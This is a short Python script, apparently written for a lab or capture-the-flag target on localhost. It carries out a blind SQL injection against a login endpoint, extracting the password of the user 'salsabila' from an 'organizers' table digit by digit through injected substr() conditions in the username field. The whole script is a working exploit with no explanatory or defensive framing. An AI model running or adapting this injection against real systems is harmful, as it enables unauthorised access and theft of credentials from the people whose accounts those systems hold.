import requests
import time
url = "http://localhost:5000/login"

digits = "0123456789"

password = ""

for i in range(1, 16):
    for digit in digits:
        payload = f"salsabila' AND substr((SELECT password FROM organizers WHERE username = 'salsabila'), {i}, 1) = '{digit}' -- "
        data = {
            "username": payload,
            "password": '.'
        }
        
        response = requests.post(url, data=data)
        print(response)
        if response.status_code == 200 :  
            password += digit
            print(f"Found character at position {i}: {digit}")
        time.sleep(0.1)

print(f"Password found: {password}")
